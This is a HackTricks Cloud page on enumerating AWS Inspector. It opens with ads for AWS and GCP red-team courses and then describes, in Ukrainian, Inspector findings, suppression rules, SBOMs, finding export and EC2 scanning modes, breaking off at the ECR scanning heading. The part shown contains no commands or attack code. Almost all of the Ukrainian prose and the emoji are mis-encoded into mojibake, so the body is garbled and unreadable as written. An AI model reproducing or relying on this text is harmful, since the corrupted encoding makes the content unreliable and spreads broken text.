# AWS - Inspector Enum

## AWS - Inspector Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Inspector

Amazon Inspector - —Ü–µ —Ä–æ–∑—à–∏—Ä–µ–Ω–∞ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∞ —Å–ª—É–∂–±–∞ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º–∏, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ –≤–∞—à–æ–≥–æ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ AWS. –¶—è —Å–ª—É–∂–±–∞ –ø–æ—Å—Ç—ñ–π–Ω–æ —Å–∫–∞–Ω—É—î –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ Amazon EC2, –æ–±—Ä–∞–∑–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤ –≤ Amazon ECR, Amazon ECS —Ç–∞ —Ñ—É–Ω–∫—Ü—ñ—ó AWS Lambda –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —Ç–∞ –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ–≥–æ –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ –≤–ø–ª–∏–≤—É. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞–¥—ñ–π–Ω—É –±–∞–∑—É –¥–∞–Ω–∏—Ö —ñ–Ω—Ç–µ–ª–µ–∫—Ç—É –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π, Amazon Inspector –Ω–∞–¥–∞—î –¥–µ—Ç–∞–ª—å–Ω—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏, –≤–∫–ª—é—á–∞—é—á–∏ —Ä—ñ–≤–Ω—ñ —Å–µ—Ä–π–æ–∑–Ω–æ—Å—Ç—ñ —Ç–∞ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—ó —â–æ–¥–æ —É—Å—É–Ω–µ–Ω–Ω—è, –¥–æ–ø–æ–º–∞–≥–∞—é—á–∏ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—è–º –ø—Ä–æ–∞–∫—Ç–∏–≤–Ω–æ –≤–∏—è–≤–ª—è—Ç–∏ —Ç–∞ —É—Å—É–≤–∞—Ç–∏ —Ä–∏–∑–∏–∫–∏ –±–µ–∑–ø–µ–∫–∏. –¶–µ–π –∫–æ–º–ø–ª–µ–∫—Å–Ω–∏–π –ø—ñ–¥—Ö—ñ–¥ –∑–∞–±–µ–∑–ø–µ—á—É—î –∑–º—ñ—Ü–Ω–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ –≤ —Ä—ñ–∑–Ω–∏—Ö —Å–ª—É–∂–±–∞—Ö AWS, —Å–ø—Ä–∏—è—é—á–∏ –¥–æ—Ç—Ä–∏–º–∞–Ω–Ω—é –≤–∏–º–æ–≥ —Ç–∞ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—é —Ä–∏–∑–∏–∫–∞–º–∏.

### Key elements

#### Findings

–í–∏—Å–Ω–æ–≤–∫–∏ –≤ Amazon Inspector - —Ü–µ –¥–µ—Ç–∞–ª—å–Ω—ñ –∑–≤—ñ—Ç–∏ –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –≤–ø–ª–∏–≤–∏, –≤–∏—è–≤–ª–µ–Ω—ñ –ø—ñ–¥ —á–∞—Å —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ EC2, —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ ECR –∞–±–æ —Ñ—É–Ω–∫—Ü—ñ–π Lambda. –í –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ —Å–≤–æ–≥–æ —Å—Ç–∞–Ω—É, –≤–∏—Å–Ω–æ–≤–∫–∏ –∫–ª–∞—Å–∏—Ñ—ñ–∫—É—é—Ç—å—Å—è —è–∫:

* **Active**: –í–∏—Å–Ω–æ–≤–æ–∫ –Ω–µ –±—É–≤ —É—Å—É–Ω–µ–Ω–∏–π.
* **Closed**: –í–∏—Å–Ω–æ–≤–æ–∫ –±—É–≤ —É—Å—É–Ω–µ–Ω–∏–π.
* **Suppressed**: –í–∏—Å–Ω–æ–≤–æ–∫ –±—É–≤ –ø–æ–∑–Ω–∞—á–µ–Ω–∏–π —Ü–∏–º —Å—Ç–∞–Ω–æ–º —á–µ—Ä–µ–∑ –æ–¥–Ω—É –∞–±–æ –∫—ñ–ª—å–∫–∞ **–ø—Ä–∞–≤–∏–ª –ø—Ä–∏–¥—É—à–µ–Ω–Ω—è**.

–í–∏—Å–Ω–æ–≤–∫–∏ —Ç–∞–∫–æ–∂ –∫–ª–∞—Å–∏—Ñ—ñ–∫—É—é—Ç—å—Å—è –Ω–∞ —Ç—Ä–∏ —Ç–∏–ø–∏:

* **Package**: –¶—ñ –≤–∏—Å–Ω–æ–≤–∫–∏ —Å—Ç–æ—Å—É—é—Ç—å—Å—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —É –ø—Ä–æ–≥—Ä–∞–º–Ω–∏—Ö –ø–∞–∫–µ—Ç–∞—Ö, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—Ö –Ω–∞ –≤–∞—à–∏—Ö —Ä–µ—Å—É—Ä—Å–∞—Ö. –ü—Ä–∏–∫–ª–∞–¥–∞–º–∏ —î –∑–∞—Å—Ç–∞—Ä—ñ–ª—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –∞–±–æ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –∑ –≤—ñ–¥–æ–º–∏–º–∏ –ø—Ä–æ–±–ª–µ–º–∞–º–∏ –±–µ–∑–ø–µ–∫–∏.
* **Code**: –¶—è –∫–∞—Ç–µ–≥–æ—Ä—ñ—è –≤–∫–ª—é—á–∞—î –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, –≤–∏—è–≤–ª–µ–Ω—ñ –≤ –∫–æ–¥—ñ –¥–æ–¥–∞—Ç–∫—ñ–≤, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ –≤–∞—à–∏—Ö —Ä–µ—Å—É—Ä—Å–∞—Ö AWS. –ó–∞–≥–∞–ª—å–Ω—ñ –ø—Ä–æ–±–ª–µ–º–∏ - —Ü–µ –ø–æ–º–∏–ª–∫–∏ –∫–æ–¥—É–≤–∞–Ω–Ω—è –∞–±–æ –Ω–µ–Ω–∞–¥—ñ–π–Ω—ñ –ø—Ä–∞–∫—Ç–∏–∫–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –ø–æ—Ä—É—à–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏.
* **Network**: –ú–µ—Ä–µ–∂–µ–≤—ñ –≤–∏—Å–Ω–æ–≤–∫–∏ –≤–∏—è–≤–ª—è—é—Ç—å –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—ñ –≤–ø–ª–∏–≤–∏ –≤ –º–µ—Ä–µ–∂–µ–≤–∏—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è—Ö, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º–∏. –î–æ –Ω–∏—Ö –≤—ñ–¥–Ω–æ—Å—è—Ç—å—Å—è –≤—ñ–¥–∫—Ä–∏—Ç—ñ –ø–æ—Ä—Ç–∏, –Ω–µ–Ω–∞–¥—ñ–π–Ω—ñ –º–µ—Ä–µ–∂–µ–≤—ñ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏ —Ç–∞ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –≥—Ä—É–ø–∏ –±–µ–∑–ø–µ–∫–∏.

#### Filters and Suppression Rules

–§—ñ–ª—å—Ç—Ä–∏ —Ç–∞ –ø—Ä–∞–≤–∏–ª–∞ –ø—Ä–∏–¥—É—à–µ–Ω–Ω—è –≤ Amazon Inspector –¥–æ–ø–æ–º–∞–≥–∞—é—Ç—å —É–ø—Ä–∞–≤–ª—è—Ç–∏ —Ç–∞ –ø—Ä—ñ–æ—Ä–∏—Ç–∏–∑—É–≤–∞—Ç–∏ –≤–∏—Å–Ω–æ–≤–∫–∏. –§—ñ–ª—å—Ç—Ä–∏ –¥–æ–∑–≤–æ–ª—è—é—Ç—å —É—Ç–æ—á–Ω–∏—Ç–∏ –≤–∏—Å–Ω–æ–≤–∫–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –∫—Ä–∏—Ç–µ—Ä—ñ—ó–≤, —Ç–∞–∫–∏—Ö —è–∫ —Å–µ—Ä–π–æ–∑–Ω—ñ—Å—Ç—å –∞–±–æ —Ç–∏–ø —Ä–µ—Å—É—Ä—Å—É. –ü—Ä–∞–≤–∏–ª–∞ –ø—Ä–∏–¥—É—à–µ–Ω–Ω—è –¥–æ–∑–≤–æ–ª—è—é—Ç—å –ø—Ä–∏–¥—É—à–∏—Ç–∏ –ø–µ–≤–Ω—ñ –≤–∏—Å–Ω–æ–≤–∫–∏, —è–∫—ñ –≤–≤–∞–∂–∞—é—Ç—å—Å—è –Ω–∏–∑—å–∫–∏–º —Ä–∏–∑–∏–∫–æ–º, –≤–∂–µ –±—É–ª–∏ –ø–æ–º'—è–∫—à–µ–Ω—ñ –∞–±–æ –∑ –±—É–¥—å-—è–∫–æ—ó —ñ–Ω—à–æ—ó –≤–∞–∂–ª–∏–≤–æ—ó –ø—Ä–∏—á–∏–Ω–∏, –∑–∞–ø–æ–±—ñ–≥–∞—é—á–∏ —ó—Ö –ø–µ—Ä–µ–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—é –≤–∞—à–∏—Ö –∑–≤—ñ—Ç—ñ–≤ –∑ –±–µ–∑–ø–µ–∫–∏ —Ç–∞ –¥–æ–∑–≤–æ–ª—è—é—á–∏ –∑–æ—Å–µ—Ä–µ–¥–∏—Ç–∏—Å—è –Ω–∞ –±—ñ–ª—å—à –∫—Ä–∏—Ç–∏—á–Ω–∏—Ö –ø–∏—Ç–∞–Ω–Ω—è—Ö.

#### Software Bill of Materials (SBOM)

–ü—Ä–æ–≥—Ä–∞–º–Ω–∏–π —Ä–∞—Ö—É–Ω–æ–∫ –º–∞—Ç–µ—Ä—ñ–∞–ª—ñ–≤ (SBOM) –≤ Amazon Inspector - —Ü–µ –µ–∫—Å–ø–æ—Ä—Ç–æ–≤–∞–Ω–∏–π –≤–∫–ª–∞–¥–µ–Ω–∏–π —Å–ø–∏—Å–æ–∫ —ñ–Ω–≤–µ–Ω—Ç–∞—Ä–∏–∑–∞—Ü—ñ—ó, —â–æ –¥–µ—Ç–∞–ª—å–Ω–æ –æ–ø–∏—Å—É—î –≤—Å—ñ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ –≤ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–º—É –ø–∞–∫–µ—Ç—ñ, –≤–∫–ª—é—á–∞—é—á–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ —Ç–∞ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ. SBOM –¥–æ–ø–æ–º–∞–≥–∞—î –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏ –ø—Ä–æ–∑–æ—Ä—ñ—Å—Ç—å —É –ª–∞–Ω—Ü—é–≥—É –ø–æ—Å—Ç–∞—á–∞–Ω–Ω—è –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∫—Ä–∞—â–µ —É–ø—Ä–∞–≤–ª—è—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º–∏ —Ç–∞ –¥–æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏—Å—è –≤–∏–º–æ–≥. –í–æ–Ω–∏ —î –≤–∞–∂–ª–∏–≤–∏–º–∏ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ç–∞ –ø–æ–º'—è–∫—à–µ–Ω–Ω—è —Ä–∏–∑–∏–∫—ñ–≤, –ø–æ–≤'—è–∑–∞–Ω–∏—Ö –∑ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º–∏ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –∑ –≤—ñ–¥–∫—Ä–∏—Ç–∏–º –∫–æ–¥–æ–º —Ç–∞ —Å—Ç–æ—Ä–æ–Ω–Ω—ñ–º–∏ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞–º–∏.

### Key features

#### Export findings

Amazon Inspector –ø—Ä–æ–ø–æ–Ω—É—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –µ–∫—Å–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ –≤–∏—Å–Ω–æ–≤–∫–∏ –≤ Amazon S3 Buckets, Amazon EventBridge —Ç–∞ AWS Security Hub, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –¥–µ—Ç–∞–ª—å–Ω—ñ –∑–≤—ñ—Ç–∏ –ø—Ä–æ –≤–∏—è–≤–ª–µ–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –≤–ø–ª–∏–≤–∏ –¥–ª—è –ø–æ–¥–∞–ª—å—à–æ–≥–æ –∞–Ω–∞–ª—ñ–∑—É –∞–±–æ –æ–±–º—ñ–Ω—É –≤ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—É –¥–∞—Ç—É —Ç–∞ —á–∞—Å. –¶—è —Ñ—É–Ω–∫—Ü—ñ—è –ø—ñ–¥—Ç—Ä–∏–º—É—î —Ä—ñ–∑–Ω—ñ —Ñ–æ—Ä–º–∞—Ç–∏ –≤–∏–≤–æ–¥—É, —Ç–∞–∫—ñ —è–∫ CSV —Ç–∞ JSON, —â–æ –ø–æ–ª–µ–≥—à—É—î —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—é –∑ —ñ–Ω—à–∏–º–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏ —Ç–∞ —Å–∏—Å—Ç–µ–º–∞–º–∏. –§—É–Ω–∫—Ü—ñ—è –µ–∫—Å–ø–æ—Ä—Ç—É –¥–æ–∑–≤–æ–ª—è—î –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ, –≤–∫–ª—é—á–µ–Ω—ñ –≤ –∑–≤—ñ—Ç–∏, —â–æ –¥–æ–∑–≤–æ–ª—è—î —Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –≤–∏—Å–Ω–æ–≤–∫–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –∫—Ä–∏—Ç–µ—Ä—ñ—ó–≤, —Ç–∞–∫–∏—Ö —è–∫ —Å–µ—Ä–π–æ–∑–Ω—ñ—Å—Ç—å, —Ç–∏–ø —Ä–µ—Å—É—Ä—Å—É –∞–±–æ –¥—ñ–∞–ø–∞–∑–æ–Ω –¥–∞—Ç, —ñ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–∫–ª—é—á–∞—Ç–∏ –≤—Å—ñ –≤–∞—à—ñ –≤–∏—Å–Ω–æ–≤–∫–∏ –≤ –ø–æ—Ç–æ—á–Ω–æ–º—É —Ä–µ–≥—ñ–æ–Ω—ñ AWS –∑—ñ —Å—Ç–∞—Ç—É—Å–æ–º Active.

–ü—Ä–∏ –µ–∫—Å–ø–æ—Ä—Ç—ñ –≤–∏—Å–Ω–æ–≤–∫—ñ–≤ –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π –∫–ª—é—á —Å–ª—É–∂–±–∏ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∫–ª—é—á–∞–º–∏ (KMS) –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö –ø—ñ–¥ —á–∞—Å –µ–∫—Å–ø–æ—Ä—Ç—É. –ö–ª—é—á—ñ KMS –∑–∞–±–µ–∑–ø–µ—á—É—é—Ç—å –∑–∞—Ö–∏—Å—Ç –µ–∫—Å–ø–æ—Ä—Ç–æ–≤–∞–Ω–∏—Ö –≤–∏—Å–Ω–æ–≤–∫—ñ–≤ –≤—ñ–¥ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É, –Ω–∞–¥–∞—é—á–∏ –¥–æ–¥–∞—Ç–∫–æ–≤–∏–π —Ä—ñ–≤–µ–Ω—å –±–µ–∑–ø–µ–∫–∏ –¥–ª—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.

#### Amazon EC2 instances scanning

Amazon Inspector –ø—Ä–æ–ø–æ–Ω—É—î –Ω–∞–¥—ñ–π–Ω—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –¥–ª—è –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ Amazon EC2 –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —Ç–∞ –ø—Ä–æ–±–ª–µ–º –±–µ–∑–ø–µ–∫–∏. Inspector –ø–æ—Ä—ñ–≤–Ω—é—î –≤–∏—Ç—è–≥–Ω—É—Ç—ñ –º–µ—Ç–∞–¥–∞–Ω—ñ –∑ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ EC2 –∑ –ø—Ä–∞–≤–∏–ª–∞–º–∏ –∑ –±–µ–∑–ø–µ–∫–æ–≤–∏—Ö —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ–π –¥–ª—è –≤–∏—Ä–æ–±–Ω–∏—Ü—Ç–≤–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –ø–∞–∫–µ—Ç—ñ–≤ —Ç–∞ –ø—Ä–æ–±–ª–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—ñ –º–µ—Ä–µ–∂—ñ. –¶—ñ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –º–æ–∂—É—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏—Å—è —á–µ—Ä–µ–∑ **–∞–≥–µ–Ω—Ç–Ω—ñ** –∞–±–æ **–±–µ–∑–∞–≥–µ–Ω—Ç–Ω—ñ** –º–µ—Ç–æ–¥–∏, –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó **—Ä–µ–∂–∏–º—É —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è** –≤–∞—à–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É.

* **Agent-Based**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∞–≥–µ–Ω—Ç AWS Systems Manager (SSM) –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–Ω—è –≥–ª–∏–±–æ–∫–∏—Ö —Å–∫–∞–Ω—É–≤–∞–Ω—å. –¶–µ–π –º–µ—Ç–æ–¥ –¥–æ–∑–≤–æ–ª—è—î –∑–¥—ñ–π—Å–Ω—é–≤–∞—Ç–∏ –≤—Å–µ–±—ñ—á–Ω–∏–π –∑–±—ñ—Ä —Ç–∞ –∞–Ω–∞–ª—ñ–∑ –¥–∞–Ω–∏—Ö –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞.
* **Agentless**: –ù–∞–¥–∞—î –ª–µ–≥–∫–∏–π –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏–π –≤–∞—Ä—ñ–∞–Ω—Ç, —è–∫–∏–π –Ω–µ –≤–∏–º–∞–≥–∞—î –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∞–≥–µ–Ω—Ç–∞ –Ω–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ, —Å—Ç–≤–æ—Ä—é—é—á–∏ –∑–Ω—ñ–º–æ–∫ EBS –∫–æ–∂–Ω–æ–≥–æ —Ç–æ–º—É –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ EC2, —à—É–∫–∞—é—á–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, –∞ –ø–æ—Ç—ñ–º –≤–∏–¥–∞–ª—è—é—á–∏ –π–æ–≥–æ; –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ—Å–Ω—É—é—á—É —ñ–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—É AWS –¥–ª—è —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è.

–†–µ–∂–∏–º —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –≤–∏–∑–Ω–∞—á–∞—î, —è–∫–∏–π –º–µ—Ç–æ–¥ –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Å–∫–∞–Ω—É–≤–∞–Ω—å EC2:

* **Agent-Based**: –í–∫–ª—é—á–∞—î –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∞–≥–µ–Ω—Ç–∞ SSM –Ω–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞—Ö EC2 –¥–ª—è –≥–ª–∏–±–æ–∫–æ—ó –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏.
* **Hybrid Scanning**: –ü–æ—î–¥–Ω—É—î —è–∫ –∞–≥–µ–Ω—Ç–Ω—ñ, —Ç–∞–∫ —ñ –±–µ–∑–∞–≥–µ–Ω—Ç–Ω—ñ –º–µ—Ç–æ–¥–∏ –¥–ª—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–≥–æ –æ—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –º—ñ–Ω—ñ–º—ñ–∑–∞—Ü—ñ—ó –≤–ø–ª–∏–≤—É –Ω–∞ –ø—Ä–æ–¥—É–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å. –£ —Ç–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä–∞—Ö EC2, –¥–µ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –∞–≥–µ–Ω—Ç SSM, Inspector –≤–∏–∫–æ–Ω–∞—î –∞–≥–µ–Ω—Ç–Ω–µ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è, –∞ –¥–ª—è —Ç–∏—Ö, –¥–µ –Ω–µ–º–∞—î –∞–≥–µ–Ω—Ç–∞ SSM, —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ –±–µ–∑–∞–≥–µ–Ω—Ç–Ω–æ.

–©–µ –æ–¥–Ω–∞ –≤–∞–∂–ª–∏–≤–∞ —Ñ—É–Ω–∫—Ü—ñ—è - —Ü–µ **–≥–ª–∏–±–æ–∫–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞** –¥–ª—è –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ EC2 –Ω–∞ –±–∞–∑—ñ Linux. –¶—è —Ñ—É–Ω–∫—Ü—ñ—è –ø—Ä–æ–ø–æ–Ω—É—î –≤—Å–µ–±—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è —Ç–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ EC2 –Ω–∞ –±–∞–∑—ñ Linux, –Ω–∞–¥–∞—é—á–∏ –¥–µ—Ç–∞–ª—å–Ω—ñ –æ—Ü—ñ–Ω–∫–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π, –≤–∫–ª—é—á–∞—é—á–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏, –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –¥–æ–¥–∞—Ç–∫—ñ–≤ —Ç–∞ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –≤—Å–µ–±—ñ—á–Ω—É –æ—Ü—ñ–Ω–∫—É –±–µ–∑–ø–µ–∫–∏. –¶–µ –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ **–∫–∞—Å—Ç–æ–º–Ω–∏—Ö —à–ª—è—Ö—ñ–≤** —Ç–∞ –≤—Å—ñ—Ö –π–æ–≥–æ –ø—ñ–¥–∫–∞—Ç–∞–ª–æ–≥—ñ–≤. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º Amazon Inspector —Å–∫–∞–Ω—É—î –Ω–∞—Å—Ç—É–ø–Ω—ñ, –∞–ª–µ –∫–æ–∂–µ–Ω –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –º–æ–∂–µ –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –¥–æ 5 –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –∫–∞—Å—Ç–æ–º–Ω–∏—Ö —à–ª—è—Ö—ñ–≤, –∞ –∫–æ–∂–µ–Ω –¥–µ–ª–µ–≥–æ–≤–∞–Ω–∏–π –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä - –¥–æ 10:

* `/usr/lib`
* `/usr/lib64`
* `/usr/local/lib`
* `/usr/local/lib64`

#### Amazon ECR container images scanning

Amazon Inspector –Ω–∞–¥–∞—î –Ω–∞–¥—ñ–π–Ω—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –¥–ª—è –æ–±—Ä–∞–∑—ñ–≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤ Amazon Elastic Container Registry (ECR), –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ç–∞ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–µ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º–∏ –ø–∞–∫–µ—Ç—ñ–≤.

